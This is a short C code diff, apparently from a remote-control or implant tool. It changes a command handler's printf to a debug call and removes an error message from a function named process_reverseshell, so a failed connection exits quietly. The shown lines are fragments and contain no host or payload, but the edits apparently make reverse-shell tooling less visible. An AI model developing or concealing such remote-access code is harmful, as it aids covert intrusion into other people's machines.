@@ -73,7 +73,7 @@ int handleCmd(const struct CmdReq * cmd, char * out, int maxSize)
                 int ret = compress2((Bytef *)rsp->data, &compressedLen, (const Bytef *)plain, payloadLen, 9);
                 if(ret == Z_OK)
                 {
-                    printf("orignal %d, after compress %ld\n", payloadLen, compressedLen);
+                    debug("orignal %d, after compress %ld\n", payloadLen, compressedLen);
                     rsp->flag = 1;
                     payloadLen = compressedLen;
                 }
@@ -362,7 +362,6 @@ int process_reverseshell(const void *in, int len, char * out, int maxSize)
 
     if(connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr)) != 0)
     {
-        perror("connect");
         close(sockfd);
         exit(0);
     }
